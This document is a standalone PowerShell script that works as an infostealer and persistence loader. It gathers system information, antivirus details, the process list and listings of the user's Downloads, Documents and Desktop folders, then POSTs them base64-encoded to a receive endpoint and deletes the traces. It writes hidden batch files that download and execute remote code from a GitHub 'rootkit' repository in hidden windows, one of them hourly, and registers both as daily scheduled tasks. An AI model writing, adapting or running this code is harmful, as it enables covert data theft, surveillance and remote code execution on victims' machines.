$srsdf='http://localhost/receive.php' 

function GetFile() {
	param (
        $mytar,
	    $name
       )
	Write-Output $name
	$dhd=[IO.File]::readallbytes($mytar);
	$kfjh=[System.Convert]::ToBase64String($dhd);
	$kfjh=[regex]::Replace($kfjh,'=','%');
	$msgin='access='+$kfjh+'&name='+$name;
	Invoke-WebRequest -Uri $srsdf -Method Post -Body $msgin;
}

$da = "{0:yyyyMMddHHmmss}" -f (Get-Date)
$filename = "$env:appdata\koala_$da"

$rc = Get-ChildItem ([Environment]::GetFolderPath('Recent'))
$ic = ipconfig /all
$gp=Get-process
$sy = systeminfo
$antivirusInfo = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntivirusProduct
$anvi = $antivirusInfo | Select-Object DisplayName, ProductState, PathToSignedProductExe
Write-Output $anvi

ac $filename $rc -Encoding 'utf8'
ac $filename $ic
ac $filename $gp
ac $filename $sy
ac $filename $anvi

$name = "info.log"

GetFile $filename $name

del $filename

$down = "$env:Appdata\down.txt"
$docu = "$env:Appdata\docu.txt"
$desk = "$env:Appdata\desk.txt"
dir "$env:userprofile\Downloads" -depth 10 >> $down
dir "$env:userprofile\Documents" -depth 10 >> $docu
dir "$env:userprofile\Desktop" -depth 10 >> $desk
GetFile $down "down.txt"
GetFile $docu "docu.txt"
GetFile $desk "desk.txt"

del $down
del $docu
del $desk

function Set_bootACL($filepath)
{
	attrib +S +H $filepath
}

$pa1File        = $env:appdata + '\koau1.bat'
$pa2File        = $env:appdata + '\koau2.bat'

$content1 ="cmd /c start /min powershell start-process powershell {[string]`$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/logger')};`$qweewqq=`$nbvccxx.Replace('wererfvx','');`$zxdsxxxxc=iex `$qweewqq;invoke-expression `$zxdsxxxxc;} -windowstyle hidden"
$content2 = "cmd /c start /min powershell start-process powershell {while(`$true){[string]`$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/urls.ps1')};`$qweewqq=`$nbvccxx.Replace('wererfvx','');`$zxdsxxxxc=iex `$qweewqq;invoke-expression `$zxdsxxxxc;start-sleep -s 3600}} -windowstyle hidden"
# $sef = $content1 + "`r`n" + "timeout `/t 1 `/nobreak >nul" + "`r`n" + $content2
sc -Path $pa1File -Value $content1 -Encoding 'ascii'
sc -Path $pa2File -Value $content2 -Encoding 'ascii'
# sc $paFile $content2 -Encoding 'utf8'
Set_bootACL($pa1File)
Set_bootACL($pa2File)
schtasks /create /tn "koauSche1" /tr "$pa1File" /sc daily /st 01:35 /f
schtasks /create /tn "koauSche2" /tr "$pa2File" /sc daily /st 01:35 /f
Start-Process -FilePath $pa1File -WindowStyle Hidden
Start-Process -FilePath $pa2File -WindowStyle Hidden

# schtasks /create /tn "koauSche" /tr "$paFile" /sc onlogon


